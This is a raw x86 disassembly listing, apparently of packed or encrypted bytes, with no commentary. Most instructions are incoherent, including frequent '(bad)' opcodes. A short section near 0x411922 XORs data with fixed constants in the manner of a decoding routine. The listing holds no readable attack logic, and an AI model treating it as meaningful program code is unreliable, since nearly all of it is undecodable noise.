  411461:	aam    0xde
  411463:	ds daa 
  411465:	fwait
  411466:	mov    ebp,0x6d7c5201
  41146b:	xor    DWORD PTR [edi+ebx*4+0x1c9e3a3],ecx
  411472:	neg    edx
  411474:	dec    esi
  411475:	clc    
  411476:	dec    edi
  411477:	(bad)  
  411478:	call   0xdaff:0x56ae090
  41147f:	fcomp  DWORD PTR [ebx+edx*1]
  411482:	psubsb mm1,mm1
  411485:	push   edi
  411486:	pushf  
  411487:	and    al,ch
  411489:	push   0xe96c4637
  41148e:	xchg   BYTE PTR [eax-0xc],al
  411491:	or     al,0x40
  411493:	cli    
  411494:	mov    ds:0xdf3955ac,eax
  411499:	clc    
  41149a:	cli    
  41149b:	adc    edi,DWORD PTR [eax-0x58103c14]
  4114a1:	mov    ah,0x14
  4114a3:	enter  0x12d0,0x9d
  4114a7:	mov    cl,BYTE PTR [ecx-0x4b]
  4114aa:	sbb    eax,0x6ebd35a9
  4114af:	sub    al,0xb9
  4114b1:	adc    eax,0x817666da
  4114b6:	mov    ch,0x35
  4114b8:	cdq    
  4114b9:	jb     0x4114e0
  4114bb:	fidiv  DWORD PTR [edx+0x12]
  4114be:	xor    ebp,DWORD PTR [ebp+0x5d6abf04]
  4114c4:	ror    ecx,1
  4114c6:	call   0x8285:0xcd24dfa7
  4114cd:	cdq    
  4114ce:	mov    BYTE PTR [eax+ecx*8-0x59],dh
  4114d2:	lods   al,BYTE PTR ds:[esi]
  4114d3:	mov    ch,0xea
  4114d5:	inc    ecx
  4114d6:	jno    0x411529
  4114d8:	push   edi
  4114d9:	inc    ecx
  4114da:	and    DWORD PTR [ecx+0x42],edx
  4114dd:	inc    esi
  4114de:	pop    ss
  4114df:	data16 fild WORD PTR [edi-0xa5b5da4]
  4114e6:	xchg   edi,eax
  4114e7:	mov    ah,0x5e
  4114e9:	jne    0x4114e5
  4114eb:	call   0xef0b2f36
  4114f0:	xor    eax,0x46e97818
  4114f5:	push   esi
  4114f6:	adc    al,0x80
  4114f8:	cmp    ebx,ebx
  4114fa:	add    bh,ch
  4114fc:	aas    
  4114fd:	mov    al,0xa6
  4114ff:	sub    ebx,DWORD PTR [ebp+0x11]
  411502:	mov    eax,edx
  411504:	je     0x411540
  411506:	cs lahf 
  411508:	xor    DWORD PTR [ecx],ecx
  41150a:	xor    al,0x23
  41150c:	jae    0x411495
  41150e:	jl     0xcc0a7eb5
  411514:	repnz dec eax
  411516:	mov    DWORD PTR [ebx-0xadcbe69],edx
  41151c:	or     eax,0x26c9858
  411521:	les    ebx,FWORD PTR [ecx]
  411523:	dec    esp
  411524:	lea    esp,[esi]
  411526:	xchg   ebx,eax
  411527:	add    BYTE PTR [esi+0x87eb8f8],0x94
  41152e:	mov    eax,0xc962c094
  411533:	or     DWORD PTR [edx],edi
  411535:	icebp  
  411536:	out    dx,al
  411537:	xor    DWORD PTR fs:[esi+0x6c],0x59d99bc5
  41153f:	cmp    al,0xbb
  411541:	jns    0x4114cd
  411543:	jmp    0x4114d2
  411545:	cmp    DWORD PTR [ebp+0x3b],esp
  411548:	out    0x52,al
  41154a:	jl     0x41153c
  41154c:	adc    dl,BYTE PTR [eax+eax*1-0x133902eb]
  411553:	cmp    eax,0xdfb75dcc
  411558:	mov    bh,0xe3
  41155a:	outs   dx,DWORD PTR ds:[esi]
  41155b:	add    eax,0x7e614704
  411560:	pop    es
  411561:	test   eax,0xb270722d
  411566:	mov    DWORD PTR [edx+edi*4],ebx
  411569:	pop    ds
  41156a:	jbe    0x411507
  41156c:	dec    edi
  41156d:	lea    edx,[edi]
  41156f:	inc    edi
  411570:	inc    eax
  411571:	outs   dx,BYTE PTR ds:[esi]
  411572:	push   cs
  411573:	clc    
  411574:	ffreep st(6)
  411576:	mov    ebp,?
  411578:	xchg   DWORD PTR [ecx-0x5bd7d924],esp
  41157e:	arpl   WORD PTR [ebx-0x557d94a4],sp
  411584:	mov    ecx,0x98c3ddc7
  411589:	enter  0x50b6,0x4a
  41158d:	or     esi,0xffffffc5
  411590:	mov    eax,ds:0xf63e0445
  411595:	inc    esi
  411596:	sahf   
  411597:	xchg   ch,cl
  411599:	pop    ebx
  41159a:	mov    al,ds:0xbc0234f
  41159f:	and    DWORD PTR [edx-0xf8eb88d],ebp
  4115a5:	jmp    0x6ef28bb1
  4115aa:	sar    dh,cl
  4115ac:	(bad)  
  4115ad:	jno    0x4115ab
  4115af:	cli    
  4115b0:	mov    ebx,0x6803416c
  4115b5:	repnz mov eax,0x133c83d
  4115bb:	mov    cl,0xfe
  4115bd:	nop
  4115be:	lods   al,BYTE PTR ds:[esi]
  4115bf:	mov    ch,0x27
  4115c1:	pop    eax
  4115c2:	pusha  
  4115c3:	(bad)  
  4115c4:	cli    
  4115c5:	sbb    dh,BYTE PTR ds:0x646b9715
  4115cb:	inc    ecx
  4115cc:	out    dx,al
  4115cd:	iret   
  4115ce:	repnz xlat BYTE PTR ds:[ebx]
  4115d0:	jg     0x4115fc
  4115d2:	(bad)  
  4115d3:	add    al,0x31
  4115d5:	les    esi,FWORD PTR ds:0x6c4a6f8
  4115db:	enter  0x1c6d,0xec
  4115df:	retf   0x82d2
  4115e2:	mov    ebx,0x1984726
  4115e7:	cwde   
  4115e8:	ja     0x411572
  4115ea:	ins    DWORD PTR es:[edi],dx
  4115eb:	jo     0x411635
  4115ed:	and    edx,0xf
  4115f0:	inc    esi
  4115f1:	sbb    BYTE PTR [ebp-0x538e6b86],bh
  4115f7:	mov    esi,0x25057da2
  4115fc:	adc    DWORD PTR [ecx-0x34],ecx
  4115ff:	mov    ebx,0x43b79cbe
  411604:	jne    0x41163d
  411606:	(bad)  
  411607:	jmp    0x87652e65
  41160c:	addr16 adc al,ah
  41160f:	cli    
  411610:	rcl    BYTE PTR ds:[ebx],cl
  411613:	adc    eax,0xf950a6fd
  411618:	mov    esi,0xa89f2354
  41161d:	getsec 
  41161f:	js     0x4115fb
  411621:	jmp    0x6131:0xe84c0659
  411628:	ins    DWORD PTR es:[edi],dx
  411629:	add    eax,0x5b8bbfad
  41162e:	sub    BYTE PTR [eax-0x13b5eaf3],cl
  411634:	jnp    0x4115be
  411636:	add    BYTE PTR [ebx+edx*8+0x5a],al
  41163a:	pop    esp
  41163b:	mov    WORD PTR [edi],gs
  41163d:	into   
  41163e:	cdq    
  41163f:	clc    
  411640:	xor    DWORD PTR [ecx+0x7d6fe704],ebp
  411646:	cwde   
  411647:	pop    DWORD PTR [edx]
  411649:	mov    ah,0xc7
  41164b:	and    ebp,DWORD PTR [edx]
  41164d:	stc    
  41164e:	in     al,0x86
  411650:	sub    al,0x88
  411652:	pop    eax
  411653:	push   ecx
  411654:	lahf   
  411655:	lods   al,BYTE PTR ds:[esi]
  411656:	std    
  411657:	dec    esi
  411658:	(bad)  
  411659:	xchg   esi,eax
  41165a:	push   cs
  41165b:	aad    0xd6
  41165d:	mov    DWORD PTR [esi+0xb],ebp
  411660:	pop    ecx
  411661:	out    0xc6,al
  411663:	or     eax,0x23b0dda8
  411668:	enter  0xd837,0xae
  41166c:	test   esi,edi
  41166e:	cmp    eax,0x1af0b259
  411673:	jp     0x411616
  411675:	and    ebx,ebx
  411677:	sbb    BYTE PTR [edi],dl
  411679:	cmp    edi,ecx
  41167b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41167c:	xor    bh,BYTE PTR [eax+0x6c43d969]
  411682:	call   0x510d0e75
  411687:	pop    edx
  411688:	call   0xe7dd4363
  41168d:	sahf   
  41168e:	iret   
  41168f:	pop    ecx
  411690:	pop    eax
  411691:	imul   ebp,edi,0x768eed29
  411697:	push   ds
  411698:	in     al,dx
  411699:	xchg   DWORD PTR [edi],edi
  41169b:	mov    eax,0x852e8308
  4116a0:	pop    edx
  4116a1:	xchg   ebx,eax
  4116a2:	je     0x4116b6
  4116a4:	dec    edx
  4116a5:	test   edi,0x4207ddd
  4116ab:	ror    BYTE PTR [edx],0xe9
  4116ae:	mov    ah,dh
  4116b0:	int    0x7e
  4116b2:	push   ebx
  4116b3:	fstp   DWORD PTR ds:[ecx-0x7e]
  4116b7:	in     eax,0x94
  4116b9:	pop    ds
  4116ba:	jecxz  0x411667
  4116bc:	call   0xfdbe:0xd2fce40d
  4116c3:	aam    0x6a
  4116c5:	cmp    BYTE PTR [esp+edx*8],ch
  4116c8:	mov    ebx,ebp
  4116ca:	push   esi
  4116cb:	mov    ebp,0xc92f301b
  4116d0:	inc    BYTE PTR [ebx]
  4116d2:	sbb    dh,BYTE PTR [eax+0x5b]
  4116d5:	jae    0x41173f
  4116d7:	popf   
  4116d8:	adc    al,0x5d
  4116da:	adc    edi,DWORD PTR [eax]
  4116dc:	xchg   ebx,eax
  4116dd:	adc    DWORD PTR [edi],ecx
  4116df:	aas    
  4116e0:	loopne 0x4116a5
  4116e2:	xor    dl,BYTE PTR [ebp+0x71821fd2]
  4116e8:	xchg   ebx,eax
  4116e9:	ds das 
  4116eb:	mov    eax,0xbe2d40a1
  4116f0:	pop    edx
  4116f1:	push   0xffffff97
  4116f3:	sbb    eax,0x5bd22e39
  4116f8:	pop    edi
  4116f9:	js     0x41174f
  4116fb:	pop    ebx
  4116fc:	cmc    
  4116fd:	test   eax,0x464abf17
  411702:	add    BYTE PTR [eax],ah
  411704:	aaa    
  411705:	or     BYTE PTR [edi+0x45cb44db],0x3a
  41170c:	add    al,0xf4
  41170e:	js     0x4116ef
  411710:	mov    WORD PTR [edx-0x53],fs
  411713:	shr    DWORD PTR [esi-0xc259b73],1
  411719:	gs aaa 
  41171b:	dec    ecx
  41171c:	not    cl
  41171e:	ins    BYTE PTR es:[edi],dx
  41171f:	and    edx,DWORD PTR [ebx-0x5b7c914c]
  411725:	lods   eax,DWORD PTR ds:[esi]
  411726:	mov    edx,0x93431187
  41172b:	jmp    DWORD PTR [eax-0x62]
  41172e:	adc    dl,bh
  411730:	sar    BYTE PTR [ebp-0x4d],0xb7
  411734:	repz rcl bh,cl
  411737:	dec    esp
  411738:	test   DWORD PTR [esi+ebp*2+0x56f0c783],ebx
  41173f:	rcl    BYTE PTR [edx-0x5c],0xa5
  411743:	adc    BYTE PTR ds:0x492f0ad2,0x24
  41174a:	sar    BYTE PTR [eax-0x3212f215],1
  411750:	xchg   BYTE PTR [esi+0x6073b3a0],ah
  411756:	aaa    
  411757:	js     0x41176f
  411759:	(bad)  
  41175a:	xadd   BYTE PTR [edi+ebx*1],al
  41175e:	(bad)  
  41175f:	loop   0x411750
  411761:	inc    ebp
  411762:	dec    ecx
  411763:	outs   dx,DWORD PTR ds:[esi]
  411764:	mov    esi,0x5d2121a2
  411769:	pop    ds
  41176a:	scas   al,BYTE PTR es:[edi]
  41176b:	cmp    ebx,DWORD PTR [esi+0x3f]
  41176e:	mov    ebp,0x3124b3c4
  411773:	repz jb 0x41171e
  411776:	mov    ecx,0x8700c57c
  41177b:	ja     0x41178e
  41177d:	adc    BYTE PTR [edi],bl
  41177f:	int3   
  411780:	mov    esp,0x20a243c3
  411785:	rcl    DWORD PTR [ecx+esi*8],cl
  411788:	mov    ecx,0x225395ed
  41178d:	repnz pop ecx
  41178f:	call   0x900d:0xf20442be
  411796:	sbb    dl,BYTE PTR [edi]
  411798:	or     DWORD PTR [edx+eax*4-0x6eeb5f9d],ecx
  41179f:	sbb    esi,eax
  4117a1:	or     dl,bh
  4117a3:	xchg   edx,eax
  4117a4:	add    DWORD PTR gs:[ebx+0x5b4928c5],0xaca37c0d
  4117af:	cmp    eax,0xc726cff
  4117b4:	mov    al,ds:0x33e6ec3f
  4117b9:	(bad)  
  4117ba:	int3   
  4117bb:	js     0x4117d4
  4117bd:	mov    ds:0x56e004d,al
  4117c2:	shl    DWORD PTR [edx+esi*4],0x91
  4117c6:	cmp    eax,0xeabeddfb
  4117cb:	lds    esi,FWORD PTR [esi+ebx*4]
  4117ce:	(bad)  
  4117cf:	mov    bh,0x38
  4117d1:	and    al,0x52
  4117d3:	xor    esp,edx
  4117d5:	push   ecx
  4117d6:	cwde   
  4117d7:	ja     0x4117f5
  4117d9:	aas    
  4117da:	or     al,0xa1
  4117dc:	push   edi
  4117dd:	arpl   WORD PTR [edx+0x75],sp
  4117e0:	dec    edi
  4117e1:	push   edx
  4117e2:	(bad)  
  4117e4:	push   ebx
  4117e5:	push   ebx
  4117e6:	push   ecx
  4117e7:	pop    ds
  4117e8:	cvtps2pi mm3,QWORD PTR [ebp-0x2cb94fc2]
  4117ef:	icebp  
  4117f0:	ror    cl,0x49
  4117f3:	lods   al,BYTE PTR ds:[esi]
  4117f4:	and    edi,edx
  4117f6:	mov    esi,0x9d9a2543
  4117fb:	iret   
  4117fc:	sbb    eax,0xc3fcf82f
  411801:	cmp    ah,bl
  411803:	add    eax,0xbf5ca2e6
  411808:	bound  eax,QWORD PTR cs:[esp+esi*4+0xcc264fc]
  411810:	out    dx,eax
  411811:	je     0x41187b
  411813:	mov    ds:0x2f99b478,al
  411818:	shl    BYTE PTR [esp+eiz*4+0x221c4d49],1
  41181f:	ds (bad) 
  411821:	push   ecx
  411822:	retf   
  411823:	mov    esp,0x8dcf58c1
  411828:	cs out dx,eax
  41182a:	stos   DWORD PTR es:[edi],eax
  41182b:	pop    edx
  41182c:	aas    
  41182d:	or     eax,0x4f9483a8
  411832:	sar    esi,1
  411834:	fbld   TBYTE PTR fs:[eax-0x6a210c7a]
  41183b:	ja     0x4117eb
  41183d:	jmp    0x41185c
  41183f:	mov    ds:0xa41860b5,al
  411844:	cmp    cl,ch
  411846:	arpl   WORD PTR cs:[ecx],si
  411849:	loopne 0x41188b
  41184b:	pop    edi
  41184c:	les    esi,FWORD PTR [eax]
  41184e:	lahf   
  41184f:	dec    esi
  411850:	adc    eax,0xd5389f76
  411855:	enter  0x2ac6,0x2a
  411859:	cld    
  41185a:	and    DWORD PTR [ebx],edx
  41185c:	fldcw  WORD PTR [ebp+ecx*8-0x2b]
  411860:	jns    0x411838
  411862:	out    dx,al
  411863:	ds inc edx
  411865:	mov    dl,0x63
  411867:	sub    edi,DWORD PTR [eax-0x251a94e]
  41186d:	arpl   WORD PTR [edx],bp
  41186f:	mov    BYTE PTR [ecx+0x7b643b23],0x51
  411876:	repnz loopne 0x4118c7
  411879:	inc    eax
  41187a:	cmp    bh,BYTE PTR ds:0x6338a108
  411880:	mov    bl,0x80
  411882:	or     al,0xbd
  411884:	hlt    
  411885:	mov    edx,DWORD PTR [eax]
  411887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411888:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411889:	and    ebp,DWORD PTR [ecx+0x3d]
  41188c:	out    0xb9,al
  41188e:	and    al,0xb
  411890:	xchg   ecx,eax
  411891:	fcom   st(1)
  411893:	out    0xb8,al
  411895:	fisttp DWORD PTR [ecx]
  411897:	sbb    bl,al
  411899:	(bad)  
  41189a:	mov    ebp,DWORD PTR [edi]
  41189c:	mov    al,BYTE PTR [ebx+edx*1+0x62]
  4118a0:	sbb    al,0x35
  4118a2:	push   esp
  4118a3:	je     0x41189f
  4118a5:	icebp  
  4118a6:	push   edi
  4118a7:	cs xchg edi,eax
  4118a9:	loopne 0x41190e
  4118ab:	cmp    al,BYTE PTR [esi+0x197047ee]
  4118b1:	push   0x7a
  4118b3:	mov    dl,0x52
  4118b5:	inc    ebp
  4118b6:	iret   
  4118b7:	and    BYTE PTR [ebx-0x41],cl
  4118ba:	push   esp
  4118bb:	int3   
  4118bc:	daa    
  4118bd:	add    al,bh
  4118bf:	pop    ebx
  4118c0:	shl    dl,0x5
  4118c3:	sbb    BYTE PTR [ebx],0x6f
  4118c6:	dec    ebx
  4118c7:	ins    BYTE PTR es:[edi],dx
  4118c8:	mov    al,0xa5
  4118ca:	add    ebp,0xf535e769
  4118d0:	enter  0xbb1,0xc6
  4118d4:	push   0xffffff90
  4118d6:	hlt    
  4118d7:	mov    ebx,0x5a578feb
  4118dc:	push   edi
  4118dd:	pusha  
  4118de:	loopne 0x411923
  4118e0:	xor    esp,esp
  4118e2:	lea    edi,[edi+0x7a]
  4118e5:	xchg   BYTE PTR [eax],al
  4118e7:	add    al,0x66
  4118e9:	shl    cl,1
  4118eb:	cmp    ch,dh
  4118ed:	imul   edx,DWORD PTR ds:0xdf97eea,0x47d2bd3f
  4118f7:	adc    al,BYTE PTR [ecx]
  4118f9:	jnp    0x4118bc
  4118fb:	sbb    ebx,ecx
  4118fd:	add    ecx,edx
  4118ff:	sbb    bl,BYTE PTR [edi+ebp*1]
  411902:	xchg   ebx,eax
  411903:	push   cs
  411904:	cmp    cl,bh
  411906:	jbe    0x41195b
  411908:	jmp    0x15d6383e
  41190d:	push   esp
  41190e:	adc    eax,0x4a756a3a
  411913:	lock scas eax,DWORD PTR es:[edi]
  411915:	(bad)  
  411916:	xor    eax,0x38f8051
  41191b:	jmp    0x7b8b:0x138b58b6
  411922:	add    al,0x50
  411924:	push   edi
  411925:	push   edx
  411926:	call   0x41df90
  41192b:	shld   edx,eax,0x2
  41192f:	mov    ecx,edx
  411931:	xor    edx,edx
  411933:	or     ecx,edx
  411935:	mov    edx,DWORD PTR [esi]
  411937:	mov    edi,DWORD PTR [esi+0x4]
  41193a:	shl    eax,0x2
  41193d:	or     eax,DWORD PTR [ebp+0x10]
  411940:	xor    edi,ecx
  411942:	xor    edx,eax
  411944:	xor    edx,0xba699573
  41194a:	xor    edi,0x9c0a89d8
  411950:	mov    DWORD PTR [esi],edx
  411952:	mov    DWORD PTR [esi+0x4],edi
  411955:	jmp    0x418549
  41195a:	mov    eax,DWORD PTR [ebp-0x24]
  41195d:	add    eax,DWORD PTR [ebp-0x4]
  411960:	mov    DWORD PTR [ebp-0x28],eax
  411963:	mov    eax,DWORD PTR [ebp-0x28]
  411966:	mov    eax,DWORD PTR [ebp-0x4]
  411969:	mov    eax,DWORD PTR [ebp-0x28]
  41196c:	mov    eax,DWORD PTR [eax+0xc]
  41196f:	mov    edx,DWORD PTR [ebp-0x4]
  411972:	movzx  eax,WORD PTR [edx+eax*1]
  411976:	cdq    
  411977:	shld   edx,eax,0x2
  41197b:	xor    edx,ecx
  41197d:	mov    DWORD PTR [ebp+0xc],edx
  411980:	mov    edx,DWORD PTR [ebp-0x58]
  411983:	jmp    0x411f0d
  411988:	jle    0x411958
  41198a:	addr16 ss daa 
  41198d:	push   ds
  41198e:	ds sahf 
  411990:	dec    ebx
  411991:	clc    
  411992:	pushf  
  411993:	outs   dx,BYTE PTR ds:[esi]
  411994:	mov    ds:0xfe68f923,al
  411999:	xor    dl,BYTE PTR [esi]
  41199b:	push   ss
  41199c:	cmp    eax,0x83161604
  4119a1:	(bad)  
  4119a2:	pusha  
  4119a3:	adc    al,0x64
  4119a5:	ins    BYTE PTR es:[edi],dx
  4119a6:	into   
  4119a7:	add    ecx,esi
  4119a9:	dec    ecx
  4119aa:	rcr    DWORD PTR [edi+0x2],0x38
  4119ae:	xor    esp,DWORD PTR [ecx+0x5b0a4012]
  4119b4:	xchg   ebp,eax
  4119b5:	or     dl,ah
  4119b7:	adc    al,0xbc
  4119b9:	and    eax,0x366807a0
  4119be:	subps  xmm4,XMMWORD PTR [esi]
  4119c1:	pusha  
  4119c2:	inc    esp
  4119c3:	jns    0x4119cd
  4119c5:	aam    0xd3
  4119c7:	mov    eax,ds:0xd452a0aa
  4119cc:	test   eax,0x5306ea0b
  4119d1:	mov    ebx,0x9c96a01a
  4119d6:	xor    eax,0xeef8b9ba
  4119db:	pop    esi
  4119dc:	xchg   DWORD PTR ds:0xbf783e13,edi
  4119e2:	xor    ebp,DWORD PTR [eax-0x42]
  4119e5:	mov    edi,0x91bf666d
  4119ea:	stos   DWORD PTR es:[edi],eax
  4119eb:	mov    ch,0xf9
  4119ed:	pop    eax
  4119ee:	sub    al,0xaa
  4119f0:	push   ebx
  4119f1:	or     esp,DWORD PTR [esp+ebp*8-0x6f]
  4119f5:	shr    DWORD PTR [esi+0x78],cl
  4119f8:	mov    esi,DWORD PTR [ecx]
  4119fa:	fiadd  WORD PTR [edi+edx*1]
  4119fd:	sbb    DWORD PTR [eax+0x36348d52],ebx
  411a03:	jecxz  0x411a2c
  411a05:	stc    
  411a06:	jmp    0x769c:0x1eebbb1d
  411a0d:	jge    0x4119c0
  411a0f:	jmp    0xbd5d:0x54db33fd
  411a16:	jno    0x411a72
  411a18:	mov    ds:0xae707cf3,al
  411a1d:	mov    DWORD PTR ss:[edi],0x9c4820a4
  411a24:	jl     0x411a9b
  411a26:	xchg   ebp,eax
  411a27:	sti    
  411a28:	lods   al,BYTE PTR ds:[esi]
  411a29:	or     DWORD PTR [esi],0x3a
  411a2c:	dec    esi
  411a2d:	mov    bh,dl
  411a2f:	pop    esp
  411a30:	push   esp
  411a31:	jmp    0xe58e4b1e
  411a36:	or     al,0x26
  411a38:	aad    0x65
  411a3a:	add    ah,bh
  411a3c:	in     eax,0xf3
  411a3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a3f:	jns    0x4119eb
  411a41:	rol    cl,1
  411a43:	loop   0x411a9b
  411a45:	out    dx,al
  411a46:	pop    edi
  411a47:	loopne 0x4119e1
  411a49:	push   ebx
  411a4a:	dec    edx
  411a4b:	icebp  
  411a4c:	fiadd  DWORD PTR [esi+edx*4-0x1f]
  411a50:	(bad)  
  411a51:	int3   
  411a52:	or     eax,0xd7b2dda
  411a57:	jno    0x411a5e
  411a59:	sbb    BYTE PTR [edi-0x76],cl
  411a5c:	loope  0x4119e3
  411a5e:	inc    eax
  411a5f:	jns    0x411abd
  411a61:	nop
  411a62:	xor    ebx,DWORD PTR [ebx+0x25]
  411a65:	fistp  WORD PTR [ecx+edi*2-0x18788c90]
  411a6c:	adc    al,0xed
  411a6e:	jge    0x411aa0
  411a70:	cli    
  411a71:	push   esi
  411a72:	pushf  
  411a73:	fdiv   QWORD PTR [esi-0x357f6919]
  411a79:	fdivr  DWORD PTR [edi]
  411a7b:	mov    eax,ds:0x444ba1b2
  411a80:	inc    ebx
  411a81:	ret    
  411a82:	cmp    DWORD PTR [ebx-0x33a4ed39],edi
  411a88:	pop    ebp
  411a89:	pop    es
  411a8a:	dec    esi
  411a8b:	scas   eax,DWORD PTR es:[edi]
  411a8c:	and    eax,0x909dade9
  411a91:	inc    ebx
  411a92:	in     eax,dx
  411a93:	test   al,0x35
  411a95:	adc    cl,bl
  411a97:	dec    eax
  411a98:	stos   DWORD PTR es:[edi],eax
  411a99:	xor    eax,0xaefa2a13
  411a9e:	inc    eax
  411a9f:	repnz mov BYTE PTR [ecx+ecx*8],ch
  411aa3:	iret   
  411aa4:	vpsllq ymm2,ymm2,XMMWORD PTR [edx]
  411aa8:	or     eax,0xaeccbc35
  411aad:	xchg   ebx,eax
  411aae:	push   ecx
  411aaf:	outs   dx,DWORD PTR ds:[esi]
  411ab0:	sub    ah,BYTE PTR [ecx]
  411ab2:	scas   eax,DWORD PTR es:[edi]
  411ab3:	sbb    BYTE PTR [eax-0x72836ee9],bh
  411ab9:	cmc    
  411aba:	add    eax,ebp
  411abc:	fisttp QWORD PTR [ebp-0xf7e9e51]
  411ac2:	dec    ebx
  411ac3:	mov    al,0x3e
  411ac5:	shr    ah,1
  411ac7:	pop    ds
  411ac8:	sub    ch,bh
  411aca:	sub    al,0x97
  411acc:	test   eax,0x401b096a
  411ad1:	cld    
  411ad2:	repz xor bl,BYTE PTR [eax]
  411ad5:	add    al,BYTE PTR [ecx]
  411ad7:	imul   esi,DWORD PTR [edx-0x7f],0xffffff83
  411adb:	sub    al,0x43
  411add:	xor    bl,BYTE PTR [edi+0x3a244d9a]
  411ae3:	cmc    
  411ae4:	dec    edx
  411ae5:	scas   al,BYTE PTR es:[edi]
  411ae6:	repnz daa 
  411ae8:	xor    eax,0xcdef85eb
  411aed:	loope  0x411b3d
  411aef:	or     bl,BYTE PTR [ecx+0x32]
  411af2:	sub    al,0x83
  411af4:	push   cs
  411af5:	jmp    0x1bf4:0x2607d214
  411afc:	mov    ch,0x53
  411afe:	int    0x8f
  411b00:	cmp    ecx,DWORD PTR [eax+ebp*1]
  411b03:	fsub   DWORD PTR [esi]
  411b05:	sbb    al,ah
  411b07:	mov    bl,BYTE PTR [ebx+ebp*2-0x40]
  411b0b:	out    0x8a,al
  411b0d:	and    BYTE PTR [eax],0x4e
  411b10:	mov    ds:0xdabf7e3,al
  411b15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b16:	(bad)  
  411b17:	mov    WORD PTR [edx-0xf903817],fs
  411b1d:	aas    
  411b1e:	and    ah,cl
  411b20:	(bad)  
  411b22:	(bad)  
  411b23:	test   al,0x52
  411b25:	or     bh,dl
  411b27:	adc    BYTE PTR [ebx-0x65],cl
  411b2a:	dec    edi
  411b2b:	mov    BYTE PTR [edx-0x2b],dl
  411b2e:	test   BYTE PTR [edx+0x7f],0xa2
  411b32:	xor    edx,DWORD PTR [edx+0x7acb886d]
  411b38:	ja     0x411b5d
  411b3a:	sbb    ecx,DWORD PTR [edx+0x5b]
  411b3d:	adc    bl,BYTE PTR [eax]
  411b3f:	mov    dl,0x44
  411b41:	loopne 0x411add
  411b43:	mov    al,0x31
  411b45:	xchg   edx,eax
  411b46:	stos   DWORD PTR es:[edi],eax
  411b47:	and    eax,0xef5d770b
  411b4c:	mov    ecx,0x550876b9
  411b51:	sub    al,BYTE PTR [esi-0x7a]
  411b54:	lods   eax,DWORD PTR ds:[esi]
  411b55:	jl     0x411b43
  411b57:	mov    dl,0xda
  411b59:	and    ebx,0xcd8b04ad
  411b5f:	sub    dl,BYTE PTR [eax-0x49f170b9]
  411b65:	cmp    DWORD PTR [edi-0x74],ebp
  411b68:	xchg   DWORD PTR [esi-0x538df9c4],ecx
  411b6e:	out    0xdb,al
  411b70:	mov    ah,0x92
  411b72:	jno    0x411b63
  411b74:	out    dx,al
  411b75:	mov    bh,0x73
  411b77:	push   ebx
  411b78:	in     al,dx
  411b79:	fisub  DWORD PTR [esi+edx*2]
  411b7c:	cmp    DWORD PTR [ebp+eax*8+0x4],ebx
  411b80:	and    esp,DWORD PTR [ebx]
  411b82:	mov    ds:0x68da2dd2,al
  411b87:	xchg   ecx,eax
  411b88:	test   DWORD PTR [eax-0x700d97a6],edx
  411b8e:	loop   0x411b9d
  411b90:	mov    ds:0x5ead6222,eax
  411b95:	and    DWORD PTR [eax+0x77],0xffffff99
  411b99:	repnz stos BYTE PTR es:[edi],al
  411b9b:	out    0xd6,al
  411b9d:	popa   
  411b9e:	ins    BYTE PTR es:[edi],dx
  411b9f:	cld    
  411ba0:	fadd   st,st(7)
  411ba2:	mov    dh,bh
  411ba4:	lods   eax,DWORD PTR ds:[esi]
  411ba5:	fld    QWORD PTR [ebx+0x261c58d2]
  411bab:	(bad)  
  411bad:	ins    BYTE PTR es:[edi],dx
  411bae:	jnp    0x411c19
  411bb0:	out    dx,al
  411bb1:	add    eax,DWORD PTR [ebx+0x13]
  411bb4:	add    ecx,DWORD PTR [edx]
  411bb6:	push   edx
  411bb7:	push   0x7c
  411bb9:	mov    ebx,0xcca7dbec
  411bbe:	push   ebx
  411bbf:	ror    DWORD PTR [eax+0x68],0x6b
  411bc3:	sahf   
  411bc4:	in     al,0x46
  411bc6:	adc    esp,DWORD PTR [edi-0x839cf2c]
  411bcc:	or     DWORD PTR [eax+0x27163f05],ebx
  411bd2:	gs push esp
  411bd4:	jne    0x411c36
  411bd6:	add    DWORD PTR [edx+0x54],edi
  411bd9:	aaa    
  411bda:	ds mov dh,0x20
  411bdd:	inc    ebp
  411bde:	sub    dl,BYTE PTR [esi+0x751d998e]
  411be4:	gs sbb dl,cl
  411be7:	jmp    0x4798:0x66f0a14f
  411bee:	push   ss
  411bef:	mov    edi,DWORD PTR [eax]
  411bf1:	and    eax,0x737815cb
  411bf6:	jl     0x411c04
  411bf8:	xlat   BYTE PTR ds:[ebx]
  411bf9:	push   esp
  411bfa:	inc    edi
  411bfb:	fdiv   QWORD PTR [eax+0x12]
  411bfe:	xor    al,0x2c
  411c00:	fs out dx,eax
  411c02:	aas    
  411c03:	addr16 push ecx
  411c05:	mov    DWORD PTR [eax-0x43444337],esi
  411c0b:	mov    BYTE PTR [esi],ch
  411c0d:	imul   ecx,esi,0x43
  411c10:	test   DWORD PTR ds:0x194153ec,esi
  411c16:	pop    ds
  411c17:	pop    ebp
  411c18:	mov    ebp,DWORD PTR [ebx+0x1f8f11c1]
  411c1e:	sub    ecx,DWORD PTR [eax]
  411c20:	dec    esp
  411c21:	jle    0x411c73
  411c23:	pop    es
  411c24:	mov    cl,0x1a
  411c26:	add    BYTE PTR [edx+ecx*4+0x56d5f49c],bh
  411c2d:	push   eax
  411c2e:	cs js  0x411c1c
  411c31:	fisttp WORD PTR [eax+eiz*1+0x1c]
  411c35:	rol    ah,cl
  411c37:	bound  eax,QWORD PTR [esi]
  411c39:	inc    ebx
  411c3a:	mov    ebx,gs
  411c3c:	dec    esi
  411c3d:	dec    edx
  411c3e:	rol    DWORD PTR [ebx-0x3a265527],1
  411c44:	stc    
  411c45:	rol    DWORD PTR [ebx],cl
  411c47:	int3   
  411c48:	xchg   ebx,eax
  411c49:	xchg   BYTE PTR [eax+0x3a],al
  411c4c:	out    0x7,al
  411c4e:	ffreep st(5)
  411c50:	inc    edi
  411c51:	shr    ch,0x50
  411c54:	faddp  st(4),st
  411c56:	and    al,0xe5
  411c58:	cmp    bh,cl
  411c5a:	sub    DWORD PTR [ebx+0x68],esi
  411c5d:	lods   eax,DWORD PTR ds:[esi]
  411c5e:	adc    BYTE PTR ds:0x7e043a35,0x98
  411c65:	pusha  
  411c66:	sbb    DWORD PTR [edi],ecx
  411c68:	xchg   edi,eax
  411c69:	mov    ecx,0x98dab109
